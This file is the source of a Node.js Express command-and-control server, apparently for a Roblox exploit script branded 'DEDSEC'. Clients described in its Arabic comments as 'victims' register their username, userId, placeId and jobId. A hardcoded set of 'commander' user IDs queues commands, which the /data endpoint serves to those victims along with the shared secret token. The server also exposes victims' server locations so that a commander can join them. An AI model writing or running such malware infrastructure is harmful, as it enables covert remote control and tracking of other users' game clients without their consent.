const express = require('express');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// ========== الإعدادات الأمنية ==========
const SECRET_TOKEN = "DEDSEC_SECURE_2025_X7K9P2";  // يجب أن يكون مطابقاً لما في سكربت العميل

// قائمة معرفات القادة (UserId)
const COMMANDER_IDS = new Set([
    5113390090,
    9172039074,
    9316949567,
    9836788803,
    9855423901
]);

// تخزين البيانات
let playersData = [];           // قائمة الأسماء المسجلة
let commandQueue = [];          // قائمة الأوامر المرسلة للضحايا
let lastCommandTime = 0;        // آخر وقت تم فيه إضافة أمر

// ========== دوال مساعدة ==========
function isCommander(userId) {
    return COMMANDER_IDS.has(userId);
}

// ========== نقاط النهاية (Endpoints) ==========

// 1. استقبال ping من العملاء (تسجيل وجودهم)
app.post('/ping', (req, res) => {
    const { username, userId, placeId, jobId, token } = req.body;
    
    // التحقق من المفتاح السري
    if (token !== SECRET_TOKEN) {
        return res.status(403).json({ error: 'Invalid token' });
    }
    
    // تحديث أو إضافة اللاعب
    const existing = playersData.find(p => p.username === username);
    if (existing) {
        existing.placeId = placeId;
        existing.jobId = jobId;
        existing.lastSeen = Date.now();
    } else {
        playersData.push({
            username,
            userId,
            placeId,
            jobId,
            lastSeen: Date.now()
        });
    }
    
    // تنظيف اللاعبين غير النشطين (آخر 30 ثانية)
    playersData = playersData.filter(p => Date.now() - p.lastSeen < 30000);
    
    res.json({ status: 'ok' });
});

// 2. الحصول على قائمة اللاعبين المسجلين
app.get('/players', (req, res) => {
    const names = playersData.map(p => p.username);
    res.json(names);
});

// 3. الحصول على بيانات لاعب معين (لأمر jointotarget)
app.get('/player/:username', (req, res) => {
    const { username } = req.params;
    const player = playersData.find(p => p.username === username);
    if (!player) {
        return res.status(404).json({ error: 'Player not found' });
    }
    res.json({
        username: player.username,
        placeId: player.placeId,
        jobId: player.jobId
    });
});

// 4. استقبال أمر من القائد (يتم تخزينه في قائمة الانتظار)
app.post('/update', (req, res) => {
    const { username, userId, message, time, token } = req.body;
    
    // التحقق من المفتاح السري
    if (token !== SECRET_TOKEN) {
        return res.status(403).json({ error: 'Invalid token' });
    }
    
    // التحقق من أن المرسل قائد معتمد
    if (!isCommander(userId)) {
        return res.status(403).json({ error: 'Unauthorized commander' });
    }
    
    // التحقق من أن الطلب جديد (لم يتم معالجته سابقاً)
    if (time <= lastCommandTime) {
        return res.status(409).json({ error: 'Command already processed' });
    }
    
    // تخزين الأمر في قائمة الانتظار
    commandQueue.push({
        username,
        userId,
        message,
        time
    });
    
    // تحديث آخر وقت تمت معالجته
    lastCommandTime = time;
    
    res.json({ status: 'queued' });
});

// 5. الحصول على أحدث أمر من قائمة الانتظار (للعرض على الضحايا)
app.get('/data', (req, res) => {
    if (commandQueue.length === 0) {
        return res.status(204).end();
    }
    // نأخذ أحدث أمر فقط (آخر عنصر في المصفوفة)
    const latest = commandQueue[commandQueue.length - 1];
    // نرسل الأمر مع المفتاح السري ليتم التحقق منه في العميل
    res.json({
        username: latest.username,
        userId: latest.userId,
        message: latest.message,
        time: latest.time,
        token: SECRET_TOKEN
    });
});

// نقطة إضافية لتفريغ قائمة الأوامر (اختياري)
app.delete('/clear', (req, res) => {
    const { token } = req.body;
    if (token !== SECRET_TOKEN) {
        return res.status(403).json({ error: 'Invalid token' });
    }
    commandQueue = [];
    res.json({ status: 'cleared' });
});

// بدء الخادم
app.listen(PORT, () => {
    // لا يوجد طباعة
});
